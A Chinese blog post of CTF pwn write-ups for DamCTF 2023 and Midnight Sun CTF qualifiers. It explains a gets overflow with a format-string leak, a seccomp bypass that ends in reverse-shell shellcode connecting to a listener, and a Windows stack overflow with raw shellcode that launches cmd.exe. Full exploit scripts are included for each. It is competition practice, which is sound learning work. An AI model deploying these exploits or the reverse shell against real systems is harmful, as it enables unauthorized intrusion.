---
layout:     post
title:      DamCTF and Midnight Sun CTF Qualifiers
subtitle:   一些PWN题目
date:       2023-04-06
author:     X1ng
header-img: 
catalog: true
tags:
    - pwn
    - wp
---

就看了几道pwn题，但佬们速度太快全秒了，赛后复现一波

文章首发于[看雪论坛](https://bbs.kanxue.com/thread-276805.htm)

## DamCTF 2023 Quals

### golden-banana

> By BobbySinclusto
>
> The Quest for the Golden Banana is a text-based adventure game that combines humor, action, and mystery in an epic story that will keep you hooked until the end. Explore exotic locations, interact with colorful characters, and make choices that will shape your destiny. Do you have what it takes to complete The Quest for the Golden Banana?
>
> The story for this challenge was entirely written by the Bing AI chatbot :-)
>
> [附件](https://github.com/X1ngn/ctf/blob/master/golden-banana.tar.gz)

是一个小游戏程序，开始时会读取房间信息，所有的信息保存在main函数中的game结构体局部变量里，每个房间的选项结构体中保存选择该选项后要到达的房间的地址。

房间信息文件里有一个SECRET ROOM，会直接输出flag。

在输入选项的地方用gets，存在溢出漏洞

```c++
// Get choice from user
gets(g.input_buf);
// Allow either specifying the number or typing the description
choice = atoi(g.input_buf) - 1;
```

输出描述信息时用printf直接打印每个房间的描述信息

```c++
 void print_location(location *l) {
    printf(l->description);
    if (l->end_location) {
        exit(0);
    }
    for (int i = 0; i < l->num_choices; ++i) {
        printf("%d: %s", i + 1, l->choices[i].description);
    }
}
```

思路是利用gets溢出覆盖到某一个房间的描述信息，通过格式化字符串泄漏出栈地址，再通过gets溢出覆盖选项结构体中目标房间的指针，跳转到SECRET ROOM。

很久没有打CTF了以至于已经忘了**gets是\x0a截断而不是\x00截断**，卡了好久

```python
#!/usr/bin/python

from pwn import *
import sys
import time
context.log_level = 'debug'
context.arch='amd64'


def exp(ip, port):
	local=1
	binary_name='golden_banana'
	libc_name='libc.so.6'

	libc=ELF("./"+libc_name)
	e=ELF("./"+binary_name)

	if local:
		p=process("./"+binary_name)
	else:
		p=remote(ip,port)



	def z(a=''):
		if local:
			gdb.attach(p,a)
			if a=='':
				raw_input
		else:
			pass
			
	ru=lambda x:p.recvuntil(x)
	sl=lambda x:p.sendline(x)
	sd=lambda x:p.send(x)
	sa=lambda a,b:p.sendafter(a,b)
	sla=lambda a,b:p.sendlineafter(a,b)
	ia=lambda :p.interactive()
	
	def cat():
		ru('> ')
		sl('cat')
		
	def echo(x):
		ru('> ')
		sl(b'echo '+x)
		
	def exit():
		ru('> ')
		sl('exit')
		
	z('b*$rebase(0x17fa)')
	time.sleep(1)
	
	ru('2: Go south')
	sl('1\x00')
	ru('2: No, go back')
	sl('2\x00'+'1'*(0x1828-2)+'%3$lx')
	ru('2: Go south')
	sl('1\x00')
	stack = int(ru(':')[:-2],16)
	ru('2: No, go back')
	sl(b'1\x00'+b'1'*(0x2028-2)+p64(stack+0x1428*11))
	
	p.interactive()
	return ''


if __name__ == "__main__":

	flag = exp(0, 0)

```



## scm

> By captainGeech
>
> Keeping track of your different shellcode payloads is annoying, but the SCM is here to help! Safety first, though!
>
> [附件](https://github.com/X1ngn/ctf/blob/master/scm.zip)

题目文件是一个shellcode管理器，3种不同的shellcode，分别用seccomp-tools查沙箱

```
'''
type1
Running shellcode... line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x06 0xc000003e  if (A != ARCH_X86_64) goto 0008
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x03 0xffffffff  if (A != 0xffffffff) goto 0008
 0005: 0x15 0x01 0x00 0x000000e7  if (A == exit_group) goto 0007
 0006: 0x06 0x00 0x00 0x80000000  return KILL_PROCESS
 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0008: 0x06 0x00 0x00 0x00000000  return KILL
 
 type2
 Running shellcode... line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x07 0xc000003e  if (A != ARCH_X86_64) goto 0009
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x04 0xffffffff  if (A != 0xffffffff) goto 0009
 0005: 0x15 0x02 0x00 0x00000000  if (A == read) goto 0008
 0006: 0x15 0x01 0x00 0x000000e7  if (A == exit_group) goto 0008
 0007: 0x06 0x00 0x00 0x80000000  return KILL_PROCESS
 0008: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0009: 0x06 0x00 0x00 0x00000000  return KILL
 
 type3
 Running shellcode... line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x07 0xc000003e  if (A != ARCH_X86_64) goto 0009
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x04 0xffffffff  if (A != 0xffffffff) goto 0009
 0005: 0x15 0x02 0x00 0x00000001  if (A == write) goto 0008
 0006: 0x15 0x01 0x00 0x000000e7  if (A == exit_group) goto 0008
 0007: 0x06 0x00 0x00 0x80000000  return KILL_PROCESS
 0008: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0009: 0x06 0x00 0x00 0x00000000  return KILL
 '''
```

在执行shellcode的时候会fork开启另一个进程来执行，由于进程是资源分配的基本单位，所以fork出的子进程的内存页面与父进程一致，可以用type3的shellcode进行write系统调用泄露地址，但是由于内存页不同，type2的shellcode往子进程的内存中写数据就没什么用。

edit shellcode的函数中，用`(unsigned __int8)`类型来判断type是否在1～3之间，在写入时又用`*(_DWORD *)(a1 + 4) = v2;`写入4字节，可以输入0x101~0x103绕过检查并使得type不合法

```c++
unsigned int v2;
... ...
      fgets((char *)&v6, 49, stdin);
      v2 = strtol((const char *)&v6, 0LL, 10);
      if ( (unsigned __int8)(v2 - 1) > 2u ) //bug
      {
        puts("Bad type!");
        return 0;
      }
      printf("Changing type to %d\n", v2);
      *(_DWORD *)(a1 + 4) = v2;
... ...
```

在执行shellcode的函数中，会根据type类型为进程加沙箱规则，禁用系统调用，但是检查时若type大于3，则会直接跳过添加沙箱规则的函数`sub_1279`直接执行

```c++
if ( !fork() )
  {
    close(2); //stderr
    if ( *((_DWORD *)a1 + 1) == 3 || (close(1), *((_DWORD *)a1 + 1) != 2) ) //stdout
    {
      close(0); //stdin
      v2 = *((_DWORD *)a1 + 1);
      if ( v2 == 3 )
      {
        if ( !(unsigned __int8)sub_1279(0LL, 1LL) )
          goto LABEL_13;
        goto LABEL_12;
      }
      if ( v2 > 3 ) //bug
        goto LABEL_12;
      if ( v2 == 1 )
      {
        if ( !(unsigned __int8)sub_1279(0LL, 0LL) )
          goto LABEL_13;
        goto LABEL_12;
      }
      if ( v2 != 2 )
        goto LABEL_12;
    }
    if ( !(unsigned __int8)sub_1279(1LL, 0LL) )
LABEL_13:
      exit(0);
LABEL_12:
    ((void (*)(void))v1)();
    goto LABEL_13;
  }
  wait((__WAIT_STATUS)stat_loc);
```

所以思路就是edit时破坏type，执行时绕过添加沙箱规则的函数直接执行shellcode，但是程序在fork出的子进程中关闭了三个基本的文件描述符，在执行的shellcode中直接调用`execve("/bin/sh",0,0)`是不行的，需要反弹shell，并且shellcode的长度需要小于0x64。

过程就是先在本地监听端口，再用shellcode完成socket, connect操作

```c
code = asm(pwnlib.shellcraft.amd64.linux.connect(ip,port))
```

由于此时文件描述符0,1,2都被关闭了，此时的socket返回的fd是0，所以再完成一次dup2操作，复制一个socket的fd为1

```python
code += asm(pwnlib.shellcraft.amd64.linux.dup2(0,1))
```

之后再执行/bin/sh时会按照正常情况将0作为标准输入，1作为标准输出来执行命令，但是此时的文件描述符0和1其实都已经是socket的fd，就在监听端获得了一个shell。

使用多线程编程来在一个窗口get shell，启一个线程与题目交互，主线程监听端口等待反弹shell。由于pwntools生成的执行sh的shellcode太长，可以自己手写一段。

```python
#!/usr/bin/python
from pwn import *
import sys
import time
import threading
context.log_level = 'debug'
context.arch='amd64'


code = asm(pwnlib.shellcraft.amd64.linux.connect('0.0.0.0',8888))
code += asm(pwnlib.shellcraft.amd64.linux.dup2(0,1))

#code += asm(pwnlib.shellcraft.amd64.linux.sh())

shell='''
	xor rsi,rsi;
	xor rdx,rdx;
	mov rax,0x68732f6e69622f;
	push rax;
	mov rdi,rsp;
	push 59;
	pop rax;
	syscall
'''
code += asm(shell)

def exp(ip, port):
	local=1
	binary_name='scm'
	libc_name='libc.so.6'

	libc=ELF("./"+libc_name)
	e=ELF("./"+binary_name)

	if local:
		p=process("./"+binary_name)
	else:
		p=remote(ip,port)



	def z(a=''):
		if local:
			gdb.attach(p,a)
			if a=='':
				raw_input
		else:
			pass
			
	ru=lambda x:p.recvuntil(x)
	sl=lambda x:p.sendline(x)
	sd=lambda x:p.send(x)
	sa=lambda a,b:p.sendafter(a,b)
	sla=lambda a,b:p.sendlineafter(a,b)
	ia=lambda :p.interactive()
	
	def cho(choice):
		ru('Choice: ')
		sl(str(choice))
		
	def add(t, s, val):
		cho(1)
		ru('write):')
		sl(str(t))
		ru('shellcode: ')
		sl(str(s))
		ru('Shellcode: ')
		sl(val)
	
	def delete(idx):
		cho(5)
		ru('index:')
		sl(str(idx))
	
	def exe(idx):
		cho(3)
		ru('index:')
		sl(str(idx))
		
	def edit(idx,ty):
		cho(2)
		ru('Shellcode index: ')
		sl(str(idx))
		ru(' (y/n):')
		sl('y')
		ru('3=write): ')
		sl(str(ty))
		ru(' (y/n): ')
		sl('n')
	
	add(1, len(code), code)
	edit(0,256+1)
	exe(0)
	return ''

if __name__ == "__main__":

	th = threading.Thread(target=exp, args=(0,0))
	th.start()
	
	io = listen(8888)
	io.wait_for_connection()
	io.interactive()

```



## Midnight Sun CTF Quals

### pyttemjuk

> Category: pwn
>
> Author: larsh
>
> Simple buffer overflow, but not your normal Linux system! Flag in c:\flag.txt
>
> [附件](https://github.com/X1ngn/ctf/blob/master/chall.exe)

Windows 平台的pwn

#### 环境搭建

安装[winchecksec](https://github.com/trailofbits/winchecksec/releases/tag/v3.1.0)

安装[x64dbg](https://x64dbg.com/#start)

在装过pip的环境中安装Windows下的pwntools

```
pip install pefile
pip install keystone
pip install capstone
pip install winpwn
```

找到winpwn库的文件路径，在cmd中打开

```
python
import winpwn
winpwn.__file__
```

打开库所在目录

![20230410161302](https://raw.githubusercontent.com/X1ngn/ctf/master/uPic/2023 04 10 16 13 02 .png)

打开dbg.py，在最底部的配置信息中填上x64dbg的文件路径

```
debugger={
    'i386':{
        'windbg':'',
        'x64dbg':'D:\\x64dbg\\release\\x32\\x32dbg.exe',
        'gdb':'',
        "windbgx":""
    },
    'amd64':{
        'windbg':'',
        'x64dbg':'',
        'gdb':'',
        "windbgx":""
    }
}

debugger_init={
    'i386':{
        'windbg':'',
        'x64dbg':'D:\\x64dbg\\release\\x32\\x32dbg.exe',
        'gdb':'',
        "windbgx":""
    },
    'amd64':{
        'windbg':'',
        'x64dbg':'',
        'gdb':'',
        "windbgx":""
    }
}
```

并且在使用remote连接远程时会报错，根据提示需要在winpwn.py文件中修改一点代码，将remote类中的`self.sock.connect((ip, port))`改为`self.sock.connect((ip, int(port)))`

```python
class remote(tube):
    def __init__(self, ip, port, family = socket.AF_INET, socktype = socket.SOCK_STREAM):
        tube.__init__(self)
        self.sock = socket.socket(family, socktype)
        self._is_exit=False
        try:
            showbanner("Connecting to ({},{})".format(ip,port))
            self.sock.settimeout(self.timeout)
            self.sock.connect((ip, int(port))) #add an int function
            
        except:
            raise(EOFError(color("[-]: Connect to ({},{}) failed".format(ip,port),'red')))
    def read(self,n,timeout=None,interactive=False):
        if timeout is not None:
            self.sock.settimeout(timeout)
        buf=b''
        try:
            buf=self.sock.recv(n)
        except KeyboardInterrupt:
            self.close()
            raise(EOFError(color("[-]: Exited by CTRL+C",'red')))
        except:
            pass
        self.sock.settimeout(self.timeout)
        return Latin1_decode(buf)
    def write(self,buf):
        return self.sock.send(Latin1_encode(buf))
    def close(self):
        self.sock.close()
        self._is_exit=True
    def is_exit(self):
        if self._is_exit:
            return True
        return False
    @tube.timeout.setter
    def timeout(self,timeout):
        self._timeout=timeout
        self.sock.settimeout(self._timeout)
```



#### 题目分析

检查保护，在下好的winchecksec的目录中找到`build\Release\winchecksec.exe`

 ```
> winchecksec.exe C:\Users\origi\Desktop\chall.exe
Warn: No load config in the PE
Results for: C:\Users\origi\Desktop\chall.exe
Dynamic Base    : "NotPresent"
ASLR            : "NotPresent"
High Entropy VA : "NotPresent"
Force Integrity : "NotPresent"
Isolation       : "Present"
NX              : "NotPresent"
SEH             : "Present"
CFG             : "NotPresent"
RFG             : "NotPresent"
SafeSEH         : "NotPresent"
GS              : "NotPresent"
Authenticode    : "NotPresent"
.NET            : "NotPresent"
 ```

逆向分析发现直接gets栈溢出，虽然开启了SEH，但是这题并不用异常处理，直接就可以注入shellcode执行。

一开始用Linux下栈溢出的思路泄露地址再算偏移ROP，但是Windows下的dll版本太杂了，主要的利用手法应该在于shellcode。在IDA中可以找到VirtualProtect函数在导出表中的位置，一般可以通过ROP调用VirtualProtect函数修改地址空间的权限，再执行写入的shellcode，但是本题栈上直接就是可执行的，直接写shellcode到一块内存跳转执行即可

需要注意的是gets溢出又\x0a截断，可以在[exploit database](https://www.exploit-db.com/exploits/42016)找到没有坏字符的shellcode，由于程序是挂载到端口上的，直接执行cmd.exe就可以get shell

```python
from winpwn import *
import os
import traceback
import sys
import socket

context.log_level = 'debug'
context.arch = 'amd64'
context.arch = 'i386'

def get_sh():
    if len(sys.argv) > 1 and sys.argv[1] == 'REMOTE':
        return remote(sys.argv[2], sys.argv[3])
    else:
        return process(r"C:\Users\origi\Desktop\chall.exe")


def get_gdb(sh, stop=False):
    x64dbg.attach(sh)


def Attack(sh=None, ip=None, port=None):
    if ip != None and port != None:
        try:
            sh = remote(ip, port)
        except:
            return 'ERROR : Can not connect to target server!'
    try:
        sh.recvuntil('Enter your name:')
        bss = 0x405040
        payload = 'a' * 28
        payload += p32(0) # ebp
        
        payload += p32(0x40263C)  # gets
        
        payload += p32(bss) 
        payload += p32(bss) 

        #get_gdb(sh)
        
        sh.sendline(payload)

        shellcode = "\x31\xc9\x64\x8b\x41\x30\x8b\x40\x0c\x8b\x40\x1c\x8b\x04\x08\x8b\x04\x08\x8b\x58\x08\x8b\x53\x3c\x01\xda\x8b\x52\x78\x01\xda\x8b\x72\x20\x01\xde\x41\xad\x01\xd8\x81\x38\x47\x65\x74\x50\x75\xf4\x81\x78\x04\x72\x6f\x63\x41\x75\xeb\x81\x78\x08\x64\x64\x72\x65\x75\xe2\x49\x8b\x72\x24\x01\xde\x66\x8b\x0c\x4e\x8b\x72\x1c\x01\xde\x8b\x14\x8e\x01\xda\x89\xd6\x31\xc9\x51\x68\x45\x78\x65\x63\x68\x41\x57\x69\x6e\x89\xe1\x8d\x49\x01\x51\x53\xff\xd6\x87\xfa\x89\xc7\x31\xc9\x51\x68\x72\x65\x61\x64\x68\x69\x74\x54\x68\x68\x41\x41\x45\x78\x89\xe1\x8d\x49\x02\x51\x53\xff\xd6\x89\xc6\x31\xc9\x51\x68\x65\x78\x65\x20\x68\x63\x6d\x64\x2e\x89\xe1\x6a\x01\x51\xff\xd7\x31\xc9\x51\xff\xd6"
        sh.sendline(shellcode)
        sh.interactive()

    except Exception as e:
        traceback.print_exc()
        sh.close()
        return 'ERROR : Runtime error!'


if __name__ == "__main__":

    sh = get_sh()
    Attack(sh=sh)
```





